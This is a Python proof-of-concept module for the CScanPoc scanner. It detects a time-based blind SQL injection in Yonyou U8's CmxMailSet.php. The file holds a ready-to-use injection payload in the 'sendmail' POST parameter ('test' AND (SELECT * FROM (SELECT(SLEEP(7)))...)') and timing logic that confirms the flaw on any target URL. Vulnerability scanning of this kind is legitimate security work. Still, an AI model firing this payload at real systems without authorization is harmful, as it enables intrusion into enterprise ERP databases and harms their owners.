# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import time

class Vuln(ABVuln):
    poc_id = '7182794c-180e-4be7-a90c-54323e9214ba'
    name = '用友u8 CmxMailSet.php SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = 'Unkonwn'  # 漏洞公布时间
    desc = '''
        用友u8 CmxMailSet.php 参数过滤不完整，SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '用友'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'd256799f-8736-4773-a119-f6fd6af432fe'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            hh = hackhttp.hackhttp()
            arg = self.target
            url = arg + "/Server/CmxMailSet.php"
            data_poc = "sendmail=test' AND (SELECT * FROM (SELECT(SLEEP(7)))MDqI) AND 'geIm'='geIm&username=test"
            data = "sendmail=test&username=test"
            time1 = time.time()
            code1, head, res, errcode, _ = hh.http(url, data)
            time2 = time.time()
            true_time = time2 - time1
            time3 = time.time()
            code2, head, res, errcode, _ = hh.http(url, data_poc)
            time4 = time.time()
            false_time = time4 - time3

            if code1 == 302 and code2 == 302 and false_time - true_time > 6:
                #security_hole(url + '  sql injection!')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
                           
        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()

